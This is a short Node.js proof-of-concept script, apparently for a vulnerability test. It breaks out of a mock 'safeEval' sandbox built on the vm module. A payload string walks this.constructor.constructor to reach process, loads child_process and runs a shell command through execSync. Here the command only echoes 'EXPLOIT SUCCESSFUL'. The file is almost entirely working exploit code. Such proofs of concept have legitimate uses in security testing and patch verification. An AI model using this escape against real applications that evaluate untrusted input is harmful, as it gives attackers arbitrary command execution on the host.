const vm = require('vm');
// Mock safeEval as a function that evaluates code in the provided context
function safeEval(code, context) {
  if (!context) context = global;
  return vm.runInNewContext(code, context);
}

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo EXPLOIT SUCCESSFUL").toString()';

try {
  const sandbox = { safeEval, orderLinesData, context: Object.create(null) };
  vm.createContext(sandbox);
  const result = vm.runInContext('safeEval(orderLinesData, context)', sandbox, { timeout: 2000 });
  console.log(result ? result.trim() : result);
} catch (e) {
  console.log("Error:", e.message);
  process.exit(1);
}
